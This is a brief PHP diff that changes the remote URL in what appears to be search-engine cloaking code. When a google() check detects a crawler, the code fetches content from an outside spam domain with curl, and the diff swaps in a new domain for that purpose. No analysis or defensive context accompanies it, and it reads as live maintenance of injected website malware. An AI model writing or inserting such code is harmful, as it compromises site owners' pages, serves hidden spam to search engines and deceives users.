@@ -8,7 +8,7 @@ function google() {
 }
 
 if (google()) {
-    $bot_content = 'https://tempatngumpul.it.com/temasgob/';
+    $bot_content = 'https://tenagakuda666.site/lavanderiaignacia/';
     
     $curl = curl_init();
 
